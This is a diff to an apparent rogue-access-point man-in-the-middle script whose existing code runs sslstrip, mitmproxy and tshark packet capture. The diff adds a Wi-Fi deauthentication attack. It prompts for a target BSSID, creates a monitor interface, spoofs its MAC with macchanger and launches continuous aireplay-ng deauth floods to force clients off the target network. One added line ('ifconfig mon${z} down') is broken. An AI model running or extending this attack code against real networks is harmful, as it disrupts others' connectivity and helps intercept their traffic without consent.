@@ -170,6 +170,7 @@ try:
         tshark_if = input("[?] Capture packets to .pcap with TSHARK? (no gui needed) Y/n: ")
         tshark_if = tshark_if.lower()
     #/WIRESHARK & TSHARK QUESTION
+   
     #SSLSTRIP MODE
     if sslstrip_if == "y" or sslstrip_if == "":
 
@@ -267,7 +268,13 @@ try:
         os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
         os.system("sudo pkill dnsmasq")
         os.system("sudo dnsmasq")
-
+    #DEAUTH QUESTION
+    deauth_if = "y"
+    deauth_if = input("[?] do you want to deauth an AP? Y/n: ")
+    if deauth_if != "n":
+        deauth_bssid = input("[?] Plese enter the BSSID to deauth: ")
+        
+    #/DEAUTH QUESITION END
         #MITMPROXY MODE
         proxy_if = input("[?] Capture traffic? Y/n: ")
         proxy_if = proxy_if.lower()
@@ -313,6 +320,17 @@ try:
                 print("[I] Starting TSHARK...")
                 os.system("sudo screen -S mitmap-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/mitmap-tshark.pcap")
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
+ 
+            if deauth_if != "n":
+                print("[I] Build the monitor Interface")
+                os.system("iw "+ap_iface+" interface add mon0 type monitor")
+                os.system("airmon-ng check kill")
+                os.system("ifconfig mon${z} down")
+                os.system("macchanger -r mon0")
+                os.system("ifconfig mon0 up")
+                print("[I] Start deauth the AP with BSSID " + deauth_bssid)
+                os.system("gnome-terminal -- aireplay-ng -0 0 -a "+deauth_bssid+" mon0 -D")
+
             print("[I] Starting AP on " + ap_iface + "...\n")
             os.system("sudo hostapd /etc/hostapd/hostapd.conf")
             #STARTING POINT
@@ -320,6 +338,10 @@ try:
     #STOPPING
     print("")
     print("[!] Stopping...")
+    if deauth_if != "n":
+        os.system("iw mon0 del")
+        print("[I] Kill the monitor interface")
+        
     if proxy_if == "y" or proxy_if == "" or sslstrip_if == "y" or sslstrip_if == "":
         os.system("sudo screen -S mitmap-hostapd -X stuff '^C\n'")
         if sslstrip_if == "y" or sslstrip_if == "":
